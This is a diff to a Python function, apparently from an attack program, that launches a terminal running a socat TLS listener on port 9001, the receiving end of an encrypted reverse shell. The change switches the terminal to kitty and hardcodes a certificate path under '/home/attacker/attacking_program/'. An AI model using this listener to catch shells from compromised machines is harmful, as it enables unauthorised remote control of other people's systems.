@@ -4,24 +4,18 @@ import shutil
 def run_socat_shell(port=9001):
     terminal_cmd = None
 
-    if shutil.which("gnome-terminal"):
+    if shutil.which("kitty"):
+        command_str = (
+            f"socat openssl-listen:{port},reuseaddr,"
+            "cert=/home/attacker/attacking_program/server.pem,verify=0 "
+            "file:$(tty),raw,echo=0"
+        )
         terminal_cmd = [
-            "gnome-terminal", "--", "bash", "-c",
-            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
-        ]
-    elif shutil.which("xterm"):
-        terminal_cmd = [
-            "xterm", "-e",
-            f"bash -c 'socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash'"
-        ]
-    elif shutil.which("konsole"):
-        terminal_cmd = [
-            "konsole", "-e", "bash", "-c",
-            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
+            "kitty", "--hold", "-e", "bash", "-c", command_str
         ]
     else:
         print("❌ Aucun terminal compatible trouvé.")
-        return
+        exit()
 
     try:
         subprocess.Popen(terminal_cmd)
